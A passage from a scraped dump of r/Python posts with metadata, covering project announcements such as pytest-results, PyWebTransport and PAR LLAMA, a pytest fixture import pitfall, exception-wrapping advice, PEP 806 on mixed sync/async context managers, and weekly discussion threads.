Priorities: Cross Platform(MacOS and Windows), high stability/perf (esp. canvas), and minimal new learning juggling other projects.

I know Python and C# basics, but MVVM/XAML trips me up hard (can grind through it, but ugh). Want to stick to \*one\* language I can reuse for scripting/automation. No commercial license fees‚Äîproprietary means closed-source binaries I can sell without drama.

Quick Project Fit

\- Core Needs: Interactive 2D canvas for diagramming (drag-drop hierarchies, snapping/zooming), invoice gen (e.g., ReportLab in Python or PdfSharp in C#), SQLite for component catalogs.

\- Modern UI Goal: aim for Fluent/Material-inspired polish.

\- Deployment: Standalone .app/.exe bundles, no web bloat.

Current Tilt: PySide

It checks every box‚Äîcanvas strength, macOS native, Python scripting, easy modernity, and LGPL for sales‚Äîwithout the MVVM wall. Avalonia tempts with .NET ecosystem and MIT simplicity, but the learning hump + diagramming tweaks feel riskier for solo.



What do you guys think? Built something similar? Switched mid-project?"
1nrtgzf,pytest-results ‚Äî Regression testing plugin for pytest,Skearways,53,5,2025-09-27 12:02:42,https://www.reddit.com/r/Python/comments/1nrtgzf/pytestresults_regression_testing_plugin_for_pytest/,"# What My Project Does

[`pytest-results`](https://github.com/100nm/pytest-results) is a pytest plugin that makes writing regression tests easier, especially when working with complex data structures.

Instead of asserting against large nested structures, a test can simply return the object. The plugin serializes it and compares it against a previously stored result. If a difference is detected, the test fails.

Supported return types:

* pydantic.BaseModel
* msgspec.Struct
* JSON-serializable Python objects
* bytes (saved as JSON files)

It is also possible to directly compare the differences following a regression in your IDE with the `--ide` parameter (e.g., `pytest --ide vscode`).

All regression files are stored in a `__pytest_results__` directory at the project root.

Example:

    from pydantic import BaseModel
    
    class ComplexModel(BaseModel):
        foo: str
        bar: str
        baz: str
    
    def test_something() -> ComplexModel:
        # ...
        model = ComplexModel(foo=""foo"", bar=""bar"", baz=""baz"")
        return model

# Target Audience

Developers who need regression testing for complex Python objects.

Teams working with API responses, data models, or serialized structures that change over time.

Anyone who wants to reduce the boilerplate of manually asserting large nested objects.

# Comparison

Existing plugins like `pytest-regressions` or `pytest-snapshot`, `pytest-results` differs by:

* Using a return-based API (no extra assertion code required).
* Providing IDE integration (`pytest --ide vscode` to review diffs directly in VSCode).
* Supporting an explicit acceptance workflow (`pytest --accept-diff` to update expected results).

Source code: [https://github.com/100nm/pytest-results](https://github.com/100nm/pytest-results)"
1nrsa7l,Would open-sourcing my OCR-to-HTML document reconstruction tool be useful?,FunBlackberry6173,9,3,2025-09-27 10:55:51,https://www.reddit.com/r/Python/comments/1nrsa7l/would_opensourcing_my_ocrtohtml_document/,"Hey everyone
I‚Äôm working on a project where we translate scanned documents and we‚Äôre using Azure OCR. As you may know, Azure gives back a very abstract JSON like structure (in my case not really usable as is).
I‚Äôve been building a tool that takes this raw OCR output (currently designed for Azure OCR‚Äôs format) and reconstructs it into a real document (HTML) that closely matches the original layout. That way, the result can be sent directly into a translation pipeline without tons of manual fixing.
So far, it‚Äôs been working really well for my use case.
My question is: would it be useful if I turned this into a Python package that others could use?Even if it starts Azure-specific, do you think people would find value in it?
Would love to hear your thoughts and feedback

"
1nrrpq2,I tried to refactor my Python code using ChatGPT...,whoeverdidnt,0,11,2025-09-27 10:21:00,https://www.reddit.com/r/Python/comments/1nrrpq2/i_tried_to_refactor_my_python_code_using_chatgpt/,"I have this [web application](https://www.synthetic-depo.com/), built as a POC, of which I am the only user.

It has a lot of inefficiencies in terms of global performance: using numerous loops, duplicated code snippets in various functions,using scipy fsolve rather than scipy brentq etc..

So I tried to refactor it with ChatGPT. Of course it does not know what I am after, so I use the output of my application as a benchmark for expected results of the refactoring. The process is quite exhausting, as ChatGPT has a lot of different coding ideas to get me there. Needless to say, he is still not there...yet.

I noted that the code is now a lot more efficient, no question about it, but I no longer understand what it does exactly: the code has clearly overreached my Python proficiency.

So I wondered if, in a lot of companies where former employees spawn their own AI outfit, there is not a case where nobody understands any longer what is going on in their very efficient code."
1nroxvz,Python script to download Reddit posts/comments with media,Unlucky_Street_60,0,22,2025-09-27 07:22:21,https://www.reddit.com/r/Python/comments/1nroxvz/python_script_to_download_reddit_postscomments/,"[Github link](https://github.com/AsfanUlla/Reddit-save)

# What My Project Does

It saves Reddit posts and comments locally along with any attached media like images, videos and gifs.

# Target Audience

Anyone who want to download Reddit posts and comments

# Comparison

Many such scripts already exists, but most of them require either auth or don't download attached media. This is a simple script which saves the post and comments locally along with the attached media without requiring any sort of auth it uses the post's json data which can be viewed by adding .json at the end of the post url (example link only works in browser: https://www.reddit.com/r/Python/comments/1nroxvz/python\_script\_to\_download\_reddit\_postscomments.json)."
1nrgwpe,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,2,0,2025-09-27 00:00:32,https://www.reddit.com/r/Python/comments/1nrgwpe/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1nrgunj,Sphinx extension to fix broken GitHub links in your docs,j-moralejo-pinas,4,4,2025-09-26 23:57:48,https://www.reddit.com/r/Python/comments/1nrgunj/sphinx_extension_to_fix_broken_github_links_in/,"# The problem

One thing that has always annoyed me when writing docs with Sphinx is that links in the README render fine on GitHub, but they always break in the built documentation.

For example:

    `Installation Guide </docs/installation.rst>`_

looks fine on GitHub, but Sphinx doesn‚Äôt understand it. If you switch to Sphinx-style references, for example

    `Installation Guide <installation>`_

works in the docs but not on GitHub.

I always had to keep 2 files which had almost the same information and that I always forgot to keep synchronized.

# What my project does

I ended up writing a small extension, **sphinx-linkfix**, that rewrites GitHub-style links into proper Sphinx references at build time. This way the same README and docs links work in *both* places 

* GitHub: [https://github.com/j-moralejo-pinas/sphinx-linkfix](https://github.com/j-moralejo-pinas/sphinx-linkfix)

It‚Äôs a tiny thing, but it has saved me a lot of frustration. I just built it just for myself, but there‚Äôs no point in keeping it private.

# Target Audience

It is not a production grade extension, but it will be useful for anyone that likes to write their documentation with Sphinx, while keeping it renderable in Github. For now, it only serves my purposes, but if you want something added, you can ask for it.

# Comparison

As far as i looked for something like this, I haven't seen other extensions that fix this problem, but correct me if I'm wrong.

Hopefully it helps others dealing with the same Sphinx + GitHub issue. Feedback and suggestions welcome!"
1nrb0eg,Realtime support added to Inngest (durable workflows) Python SDK,self-taught16,13,0,2025-09-26 19:46:51,https://www.reddit.com/r/Python/comments/1nrb0eg/realtime_support_added_to_inngest_durable/,"# What my project does

Inngest provides a durable workflow engine that enables devs to ship reliable backend processes, from multi-stage pipelines to AI workflows.

# What's new with this release

Today's release (`0.5.9`) adds built-in realtime support powered by WebSockets. This now allows the async, durable workflows to push messages or stream updates to the client side without additional libraries or infrastructure.

# Use cases

The main purpose of this is to combine the typically long-running, multi-step durable workflows with realtime channels which can send progress updates, LLM chunks or other data to the browser to make applications more interactive.

# Github, docs, guides

* More info: [https://www.inngest.com/blog/python-realtime](https://www.inngest.com/blog/python-realtime)
* Python quick start: [https://www.inngest.com/docs/getting-started/python-quick-start](https://www.inngest.com/docs/getting-started/python-quick-start)
* Realtime guide: [https://www.inngest.com/docs/features/realtime?guide=python](https://www.inngest.com/docs/features/realtime?guide=python)
* Example project on Github: [https://github.com/inngest/inngest-py/tree/main/examples/fast\_api\_realtime](https://github.com/inngest/inngest-py/tree/main/examples/fast_api_realtime)
* SDK repo: [https://github.com/inngest/inngest-py](https://github.com/inngest/inngest-py)
* Discord: [https://inngest.com/discord](https://inngest.com/discord)

# Target Audience

Python developers who want a solution to run reliable background work that also 

Devs that are building AI workflows often see this problem. LLMs are slow or you might chain multiple calls together so you reach for a queue, but then the user doesn't get feedback while they wait. Folks cobble things together with streaming APIs, but then loose the reliability of queues. 

# Comparison

Existing solutions like Celery and RabbitMQ are good for queuing tasks, but is missing durable execution. [Durable execution](https://www.inngest.com/blog/principles-of-durable-execution) adds incremental execution of steps, fault tolerance, state persistence. Inngest's event-driven durable execution adds more reliability to these workflows without having to manage infrastructure."
1nrade3,Haiku Validator: a simple Flask web app to write haikus!,mrstone56,9,3,2025-09-26 19:21:11,https://www.reddit.com/r/Python/comments/1nrade3/haiku_validator_a_simple_flask_web_app_to_write/,"https://github.com/scottastone/haiku-maker

https://haikuvalidator.com/

What My Project Does:

A little flask app to write and validate haikus. It's definitely not perfect and makes some mistakes. It uses Flask for the web backend and syllables python libraries to estimate how many syllables are in each word. No fancy AI here.

You can check the override list at https://haikuvalidator.com/overrides and if you have any suggestions feel free to let me know any words that are broken.

Comparison: 

Uhh I don't know if anyone else has done exactly this - most of the ones I found online didn't seem to work well.

Target Audience: 

This is my first time making a web app. Hoping that someone finds it fun / useful."
1nra2ps,PAR LLAMA v0.7.0 Released - Enhanced Security & Execution Experience,probello,5,2,2025-09-26 19:09:45,https://www.reddit.com/r/Python/comments/1nra2ps/par_llama_v070_released_enhanced_security/,"# What It Does

A powerful Terminal User Interface (TUI) for managing and interacting with Ollama and other major LLM providers ‚Äî featuring **persistent AI memory**, **secure code execution**, **interactive development workflows**, and **truly personalized conversations**!

PAR LLAMA Chat Interface

# What's New in v0.7.0

# Improved Execution Experience

* **Better Result Formatting**: Clean, professional display of execution results
* **Smart Command Display**: Shows 'python -c <script>' instead of escaped code for CLI parameters
* **Syntax-Highlighted Code Blocks**: Short scripts (‚â§10 lines) display with proper syntax highlighting
* **Intelligent Language Detection**: Automatic highlighting for Python, JavaScript, and Bash
* **Clean Command Truncation**: Long commands truncated intelligently for better readability

# Previous Major Features (v0.6.0)

# Memory System

* **Persistent User Context**: AI remembers who you are and your preferences across ALL conversations
* **Memory Tab Interface**: Dedicated UI for managing your personal information and context
* **AI-Powered Memory Updates**: Use `/remember` and `/forget` slash commands for intelligent memory management
* **Automatic Injection**: Your memory context appears in every new conversation automatically
* **Real-time Synchronization**: Memory updates via commands instantly reflect in the Memory tab
* **Smart Context Management**: Never repeat your preferences or background information again

# Template Execution System

* **Secure Code Execution**: Execute code snippets and commands directly from chat messages using **Ctrl+R**
* **Multi-Language Support**: Python, JavaScript/Node.js, Bash, and shell scripts with automatic language detection
* **Configurable Security**: Command allowlists, content validation, and comprehensive safety controls
* **Interactive Development**: Transform PAR LLAMA into a powerful development companion
* **Real-time Results**: Execution results appear as chat responses with output, errors, and timing

# Enhanced User Experience

* **Memory Slash Commands**: `/remember [info]`, `/forget [info]`, `/memory.status`, `/memory.clear`
* **Intelligent Updates**: AI intelligently integrates new information into existing memory
* **Secure Storage**: All memory data stored locally with comprehensive file validation
* **Options Integration**: Both Memory and Template Execution controls in Options tab
* **Settings Persistence**: All preferences persist between sessions

# Core Features

* **Memory System**: Persistent user context across all conversations with AI-powered memory management
* **Template Execution**: Secure code execution system with configurable safety controls
* **Multi-Provider Support**: Ollama, OpenAI, Anthropic, Groq, XAI, OpenRouter, Deepseek, LiteLLM
* **Vision Model Support**: Chat with images using vision-capable models
* **Session Management**: Save, load, and organize chat sessions
* **Custom Prompts**: Create and manage custom system prompts and Fabric patterns
* **Theme System**: Dark/light modes with custom theme support
* **Model Management**: Pull, delete, copy, and create models with native quantization
* **Smart Caching**: Intelligent per-provider model caching with configurable durations
* **Security**: Comprehensive file validation and secure operations

# Key Features

* **100% Python**: Built with Textual and Rich for a beautiful easy to use terminal experience. Dark and Light mode support, plus custom themes
* **Cross-Platform**: Runs on Windows, macOS, Linux, and WSL
* **Async Architecture**: Non-blocking operations for smooth performance
* **Type Safe**: Fully typed with comprehensive type checking

# GitHub & PyPI

* GitHub: [https://github.com/paulrobello/parllama](https://github.com/paulrobello/parllama)
* PyPI: [https://pypi.org/project/parllama/](https://pypi.org/project/parllama/)

# Comparison:

I have seen many command line and web applications for interacting with LLM's but have not found any TUI related applications as feature reach as PAR LLAMA

# Target Audience

If you're working with LLMs and want a powerful terminal interface that **remembers who you are** and **bridges conversation and code execution** ‚Äî PAR LLAMA v0.7.0 is a game-changer. Perfect for:

* **Developers**: Persistent context about your tech stack + execute code during AI conversations
* **Data Scientists**: AI remembers your analysis preferences + run scripts without leaving chat
* **DevOps Engineers**: Maintains infrastructure context + execute commands interactively
* **Researchers**: Remembers your research focus + test experiments in real-time
* **Consultants**: Different client contexts persist across sessions + rapid prototyping
* **Anyone**: Who wants truly personalized AI conversations with seamless code execution"
1nr7ozl,Rock Paper Scissors Arena simulator with tkinter,AlSweigart,24,1,2025-09-26 17:36:23,https://www.reddit.com/r/Python/comments/1nr7ozl/rock_paper_scissors_arena_simulator_with_tkinter/,"[GitHub link](https://github.com/asweigart/rpsarena) | [PyPI link](https://pypi.org/project/rpsarena) | [Explanatory blog post with video](https://inventwithpython.com/blog/rps-arena.html)

# What My Project Does

Rock Paper Scissors ""arena simulator"" where different emojis play a game of tag. Emoji converts the ""prey"" emoji that they catch. [You can see an example video in the blog post.](https://inventwithpython.com/blog/rps-arena.html)

# Target Audience

General Python developers or those interested in simulations

# Comparison

This is not an original project; many such rock-paper-scissors simulators exist. However, I wanted a pure Python package that didn't have external dependencies and was suitable for a ""screensaver"" or a ""simulation experiments"" style of execution."
1nr49v6,"AI Pothole Detector LIVE ‚Äì Testing on Varthur-Gunjur Road, Bangalore üöß",chandan__m,0,2,2025-09-26 15:24:49,https://www.reddit.com/r/Python/comments/1nr49v6/ai_pothole_detector_live_testing_on_varthurgunjur/,"[https://www.youtube.com/watch?v=mJGvRONdpbI](https://www.youtube.com/watch?v=mJGvRONdpbI)

üëâ On just a 50-meter stretch, the AI detected 32 potholes in real time, logging their location, number, and timestamp into a live dataset.  
  
üîç What‚Äôs inside this demo:  
  
Live video feed with AI highlighting potholes  
  
Automatic logging of pothole data to Excel/CSV  
  
Real-time insights for road maintenance  
  
üõ† Why it matters for Bangalore:  
  
Government has announced massive budgets for road repair (‚Çπ5,948 crore for maintenance).  
  
Early detection can save money, reduce accidents, and avoid endless manual inspections.  
  
This system can integrate into Smart City solutions, giving authorities accurate, real-time maps of road damage.  
  
This is just the beginning ‚Äî I‚Äôm working on upgrades to also detect size, depth, and severity of potholes.  
  
üí° Do you think AI like this can help solve Bangalore‚Äôs pothole problem? Share your thoughts in the comments!  
  
If you find this useful, please like, share, and subscribe to support more tech-driven solutions for our city‚Äôs infrastructure."
1nr3qvm,Pytrithon: Graphical Petri-Net Inspired Agent Oriented Programming Language Based On Python,Pytrithon,6,3,2025-09-26 15:04:32,https://www.reddit.com/r/Python/comments/1nr3qvm/pytrithon_graphical_petrinet_inspired_agent/,"# What My Project Does
Pytrithon is a graphical petri-net inspired agent oriented programming language based on Python. Do not worry, there is no need to understand formal petri-nets, the language instead is only inspired by them and is very simple and intuitive. Instead of a tree structure of linear code files, you have multiple Agents, each being a two dimensional graphical Pytri net, which cooperate with eachother. Pytrithon introduces native inter Agent communication into the core language as a first class member. You can directly model the actual control flow of an Agent which frees you from the strict linear recursive method calling of Python and enables many more modes of structuring the code. The Pytri nets you will create are very intuitive and readable, just by looking at them you can directly understand how the Agents operate, you don't need to browse the code as you do in plain Python and jump from file to file, method to method, desperately trying to reverse engineer how the code works. There are Places which store intermediate and global data and there are subtypes which express different use cases of variables, like queues and stacks. Pytrithon has many different Transitions, which are the actors of an Agent and are triggered by Places. The main Python Transition allows you to directly assign an arbitrary Python snippet as an action and allows for the powerful triggering of other parts of the Pytri net through supression. There also are different types of Tansitions which embody different kinds of intra Agent control flow, like an explicit if or switch, sending and receiving a signal, defining and using the Pytri net equivalent of a method, a Nethod. For inter Agent communication there are Transitions for sending and receiving arbitrary Python objects inbetween Agents, and the Task abstaction allows for an Agent to offer a service to other Agents which can be utilized as a single Transition on the caller's side. What makes a Pytri net so graspable is that all the control flow is apparent through explicit graphical Arcs, which connect Places to Transitions and hint at what follows what. Entire Pytri nets can be turned into Fragments and embedded into any Agent to modularize Pytrithon code. Ontology Concepts can be defined by stating their slots and are used to encapsulate data. One of Pytrithon's strengths is that you can monitor and manipulate Agents through the Monipulator, even during their execution, and can see the state of an Agent by viewing the contents of Places inside its Pytri net.
# Target Audience
Pytrithon is for developers of all skill levels who want to try something new. Experienced Python programmers should value the new expressiveness it offers and know intuitively how to operate it. It is especially suited for Python beginners who want to kickstart into a much mightier language and want to learn about Agents communicating with one another on the fly. Pytrithon is an universal programming language which can be used for anything Python can be used for. It is suitable for quick prototyping, since you can directly embed GUI widgets into an Agent, but can also be used for more demanding and complex use cases, exemplified by TMWOTY2, a full Pygame game, which runs at 60 frames per second across 6 different Agents.
# Why I Built It
At university I got introduced to a formal Petri net tool which was there used to learn about Petri nets and agent oriented programming, with which we implemented a Settlers game. I really enjoyed the expressiveness of Petri nets but found out that its formal nature made simple tasks very complicated. There were huge structures just to send data from one agent to another and you had to understand Petri nets in depth. I wanted something similar but way more intuitive and terse and adapted it into the Pytrithon language for more than 15 years now by rethinking how to integrate it deeply with Python.
# Comparison
Nothing compares to Pytrithon, it is its very own thing. Most textual programming languages are based on linear files. Most graphical programming languages do not allow embedding arbitrary code and are just glorified parametrized flowcharts.
# How To Explore
At least Python 3.10 is required to run all example Agents. The install script should install all required packages. Then you can run the pytrithon script to open up a Monipulator and check out the example Agents by hitting ctrl-o. If you prefer using the console, run 'python nexus -m <agentname>'. Recommended Agents to try are: ""basic"", ""calculator"", ""kniffel"", ""guess"", ""pokerserver"" + multiple ""poker"", ""chatserver"" + multiple ""chat"", ""image"", ""jobapplic"", and ""nethods"". There are also scripts for running and editing TMWOTY2. Your focus should be on the workbench folder, Pytrithon is just the backstage where the magic happens.
# GitHub Link
https://github.com/JochenSimon/pytrithon
---
When you give it a try, I would really appreciate feedback, because I have not had any yet, since I only recently found the courage to present it. I welcome being told of any problems when installing and running it, so that I can fix them and they do not bother people anymore. I would enjoy hearing your opinions and ideas for improvement, it would mean a lot to me if you explore several of the example Agents. I welcome any questions and would love to answer them."
1nr2kmn,How pytest fixtures screwed me over,JauriXD,166,64,2025-09-26 14:18:15,https://www.reddit.com/r/Python/comments/1nr2kmn/how_pytest_fixtures_screwed_me_over/,"I need to write this of my chest, so to however wants to read this, here is my ""fuck my life"" moment as a python programmer for this week:

I am happily refactoring a bunch of pytest-testcases for a work project. With this, my team decided to switch to explicitly import fixtures into each test-file instead of relying on them ""magically"" existing everywhere. Sounds like a good plan, makes things more explicit and easier to understand for newcomers. Initial testing looks good, everything works.

I commit, the full testsuit runs over night. Next day I come back to most of the tests erroring out. Each one with a connection error. ""But that's impossible?"" We use a scope of session for your connection, there's only one connection for the whole testsuite run. There can be a couple of test running fine and than a bunch who get a connection error. How is the fixture re-connecting? I involve my team, nobody knows what the hecks going on here.
So I start digging into it, pytests docs usually suggest to import once in the `contest.py` but there is nothing suggesting other imports should't work.

Than I get my Heureka: unter some obscure stack overflow post is a comment: _pytest resolves fixtures by their *full* import path, not just the symbol used in the file_. What? 

But that's actually why non of the session-fixtures worked as expected. Each import statement creates a new fixture, each with a different import-path, even if they all look the same when used inside tests. Each one gets initialised seperatly and as they are scoped to the session, only destroyed at the end of the testsuite. Great... So back to global imports we went.

I hope this helps some other tormented should and shortens the search for why pytest fixtures sometimes don't work as expected. Keep Coding!"
1nr26fk,Feeling guilty using Bootstrap while learning Flask,MelodicChampion5736,16,59,2025-09-26 14:02:27,https://www.reddit.com/r/Python/comments/1nr26fk/feeling_guilty_using_bootstrap_while_learning/,"So I‚Äôm learning Flask rn and using Bootstrap for the HTML part. I do know HTML/CSS, but I feel kinda guilty using pre-made stuff instead of coding everything from scratch.
Is this chill or am I lowkey skipping real learning? üò¨"
1nqvsvd,Material 3 Design Comes To Slint GUI Toolkit,slint-ui,19,0,2025-09-26 08:22:18,https://www.reddit.com/r/Python/comments/1nqvsvd/material_3_design_comes_to_slint_gui_toolkit/,"üöÄ¬†Speed up UI development with pre-built components,  
üöÄ¬†Deliver a polished, touch-friendly, familiar user interface for your products,  
üöÄ¬†Build a user interface that seamlessly works across desktop, mobile, web, and embedded devices.

Explore:¬†[https://material.slint.dev](https://material.slint.dev/)  
Get started:¬†[https://material.slint.dev/getting-started](https://material.slint.dev/getting-started)"
1nqv24k,Re-define or wrap exceptions from external libraries?,Ok_Constant_9126,26,16,2025-09-26 07:33:15,https://www.reddit.com/r/Python/comments/1nqv24k/redefine_or_wrap_exceptions_from_external/,"I'm wondering what the best practice is for the following situation:

  
Suppose I have a Python package that does some web queries. In case it matters, I follow the Google style guide. It currently uses `urllib`. If those queries fails, it currently raises a `urllib.error.HTTPError`. 

Any user of my Python package would therefore have to catch the  `urllib.error.HTTPError` for the cases where the web queries fail. This is fine, but it would be messy if I at some point decide not to use `urllib` but some other external library.


I could make a new `mypackage.HTTPError` or `mypackage.QueryError` exception, and then do a `try: ... catch urllib.error.HTTPError: raise mypackage.QueryError` or even

```
try: 
    ... 
catch urllib.error.HTTPError as e:
    raise mypackage.QueryError from e
```

What is the recommended approach?"
1nqudfd,Which Python package manager makes automation easiest in 2025?,trickythinking07,0,35,2025-09-26 06:48:45,https://www.reddit.com/r/Python/comments/1nqudfd/which_python_package_manager_makes_automation/,"Trying to make your Python automation smooth and hassle-free? Which package manager do you actually reach for:

* **pip** ‚Äì simple and classic
* **pipenv** ‚Äì keeps it tidy
* **poetry** ‚Äì fancy and powerful
* **conda** ‚Äì big on data science
* **Other** ‚Äì drop your fav in the comments!

Curious to see what everyone else uses‚Äîshare your pick and why!

**Note:** I know automation doesn‚Äôt strictly depend on the package manager, but I want to know which one makes it easier to manage virtual environments, lock files, and dependencies‚Äîespecially when taking a project live in production."
1nqrmrd,"Show r/Python: PyWebTransport ‚Äì The canonical, async-native WebTransport stack for Python.",CodeOrganic3141,9,7,2025-09-26 04:06:23,https://www.reddit.com/r/Python/comments/1nqrmrd/show_rpython_pywebtransport_the_canonical/,"Hi everyone,

I'm excited to share `PyWebTransport`, a modern, async-native networking library for Python. It's designed as a powerful alternative to WebSockets, leveraging the QUIC protocol to solve issues like head-of-line blocking and provide more versatile communication patterns.

The project is open-source, fully documented, and available on PyPI. It provides a high-level, asyncio-native API for the WebTransport protocol, allowing you to build high-performance, real-time network applications.

### What My Project Does

`PyWebTransport`'s main features include:

- **Full Async Support**: Built from the ground up on asyncio for high-performance, non-blocking I/O.
- **High-Level Frameworks**: Includes a ServerApp with routing and middleware, and a versatile WebTransportClient with helpers for pooling, auto-reconnection, and proxying.
- **Advanced Messaging**: Built-in managers for Pub/Sub and RPC (JSON-RPC 2.0 compliant), plus pluggable serializers (`JSON`, `MsgPack`, `Protobuf`) for structured data.
- **Complete Protocol Implementation**: Full support for bidirectional and unidirectional streams, as well as unreliable datagrams.
- **Lifecycle and Resource Management**: Robust, async context-managed components for handling connections, sessions, streams, and monitoring.
- **Event-Driven Architecture**: A powerful EventEmitter and EventBus system for decoupled, asynchronous communication between components.
- **Type-Safe and Tested**: A fully type-annotated API with extensive test coverage (unit, integration, E2E) to ensure reliability and maintainability.

### Target Audience

This library is intended for developers building **high-performance, real-time network applications** in Python.

It is designed with production use cases in mind. Features like robust resource management to prevent leaks, detailed statistics for monitoring, and the auto-reconnect client are all included to support stable, long-running services.

### Comparison

The main alternative is WebSockets. `PyWebTransport` differs by leveraging QUIC to offer:

- **No Head-of-Line Blocking**: Because it supports multiple, independent streams, a slow or large message on one stream doesn't block others.
- **Unreliable Datagrams**: It provides a datagram API for sending low-latency, non-guaranteed messages, which WebSockets doesn't offer. This is ideal for things like real-time game state or voice data.
- **Unidirectional Streams**: It supports write-only and read-only streams, which can be more efficient for certain application patterns, like a client sending a continuous stream of telemetry.

### A Quick Look at the API

#### Server (`server.py`)

```python
import asyncio

from pywebtransport import (
    ConnectionError,
    ServerApp,
    ServerConfig,
    SessionError,
    WebTransportSession,
    WebTransportStream,
)
from pywebtransport.utils import generate_self_signed_cert

generate_self_signed_cert(hostname=""localhost"")

app = ServerApp(
    config=ServerConfig.create(
        certfile=""localhost.crt"",
        keyfile=""localhost.key"",
        initial_max_data=1024 * 1024,
        initial_max_streams_bidi=10,
    )
)


async def handle_datagrams(session: WebTransportSession) -> None:
    try:
        datagram_transport = await session.datagrams
        while True:
            data = await datagram_transport.receive()
            await datagram_transport.send(data=b""ECHO: "" + data)
    except (ConnectionError, SessionError, asyncio.CancelledError):
        pass


async def handle_streams(session: WebTransportSession) -> None:
    try:
        async for stream in session.incoming_streams():
            if isinstance(stream, WebTransportStream):
                data = await stream.read_all()
                await stream.write_all(data=b""ECHO: "" + data)
    except (ConnectionError, SessionError, asyncio.CancelledError):
        pass


@app.route(path=""/"")
async def echo_handler(session: WebTransportSession) -> None:
    datagram_task = asyncio.create_task(handle_datagrams(session))
    stream_task = asyncio.create_task(handle_streams(session))
    try:
        await session.wait_closed()
    finally:
        datagram_task.cancel()
        stream_task.cancel()


if __name__ == ""__main__"":
    app.run(host=""127.0.0.1"", port=4433)

```

#### Client (`client.py`)

```python
import asyncio
import ssl

from pywebtransport import ClientConfig, WebTransportClient


async def main() -> None:
    config = ClientConfig.create(
        verify_mode=ssl.CERT_NONE,
        initial_max_data=1024 * 1024,
        initial_max_streams_bidi=10,
    )

    async with WebTransportClient(config=config) as client:
        session = await client.connect(url=""https://127.0.0.1:4433/"")

        print(""Connection established. Testing datagrams..."")
        datagram_transport = await session.datagrams
        await datagram_transport.send(data=b""Hello, Datagram!"")
        response = await datagram_transport.receive()
        print(f""Datagram echo: {response!r}\n"")

        print(""Testing streams..."")
        stream = await session.create_bidirectional_stream()
        await stream.write_all(data=b""Hello, Stream!"")
        response = await stream.read_all()
        print(f""Stream echo: {response!r}"")

        await session.close()


if __name__ == ""__main__"":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass

```

### Links

- **GitHub (Source & Issues)**: `https://github.com/lemonsterfy/pywebtransport`

The goal was to create a robust and well-documented library that fits naturally into the Python `asyncio` ecosystem. All feedback, suggestions, and contributions are welcome.

Would love to hear feedback from anyone who‚Äôs tried experimenting with QUIC or WebTransport in Python.
"
1nqnm44,PEP 806 ‚Äì Mixed sync/async context managers with precise async marking,kirara0048,176,22,2025-09-26 00:44:27,https://www.reddit.com/r/Python/comments/1nqnm44/pep_806_mixed_syncasync_context_managers_with/,"PEP 806 ‚Äì Mixed sync/async context managers with precise async marking

[https://peps.python.org/pep-0806/](https://peps.python.org/pep-0806/)

# Abstract

Python allows the¬†`with`¬†and¬†`async¬†with`¬†statements to handle multiple context managers in a single statement, so long as they are all respectively synchronous or asynchronous. When mixing synchronous and asynchronous context managers, developers must use deeply nested statements or use risky workarounds such as overuse of¬†[`AsyncExitStack`](https://docs.python.org/3/library/contextlib.html#contextlib.AsyncExitStack).

We therefore propose to allow¬†`with`¬†statements to accept both synchronous and asynchronous context managers in a single statement by prefixing individual async context managers with the¬†`async`¬†keyword.

This change eliminates unnecessary nesting, improves code readability, and improves ergonomics without making async code any less explicit.

# Motivation

Modern Python applications frequently need to acquire multiple resources, via a mixture of synchronous and asynchronous context managers. While the all-sync or all-async cases permit a single statement with multiple context managers, mixing the two results in the ‚Äústaircase of doom‚Äù:

    async def process_data():
        async with acquire_lock() as lock:
            with temp_directory() as tmpdir:
                async with connect_to_db(cache=tmpdir) as db:
                    with open('config.json', encoding='utf-8') as f:
                        # We're now 16 spaces deep before any actual logic
                        config = json.load(f)
                        await db.execute(config['query'])
                        # ... more processing

This excessive indentation discourages use of context managers, despite their desirable semantics. See the¬†[Rejected Ideas](https://peps.python.org/pep-0806/#rejected-ideas)¬†section for current workarounds and commentary on their downsides.

With this PEP, the function could instead be written:

    async def process_data():
        with (
            async acquire_lock() as lock,
            temp_directory() as tmpdir,
            async connect_to_db(cache=tmpdir) as db,
            open('config.json', encoding='utf-8') as f,
        ):
            config = json.load(f)
            await db.execute(config['query'])
            # ... more processing

This compact alternative avoids forcing a new level of indentation on every switch between sync and async context managers. At the same time, it uses only existing keywords, distinguishing async code with the¬†`async`¬†keyword more precisely even than our current syntax.

We do not propose that the¬†`async¬†with`¬†statement should ever be deprecated, and indeed advocate its continued use for single-line statements so that ‚Äúasync‚Äù is the first non-whitespace token of each line opening an async context manager.

Our proposal nonetheless permits¬†`with¬†async¬†some_ctx()`, valuing consistent syntax design over enforcement of a single code style which we expect will be handled by style guides, linters, formatters, etc. See¬†[here](https://peps.python.org/pep-0806/ban-single-line-with-async)¬†for further discussion."
1nqmont,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,3,1,2025-09-26 00:00:48,https://www.reddit.com/r/Python/comments/1nqmont/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

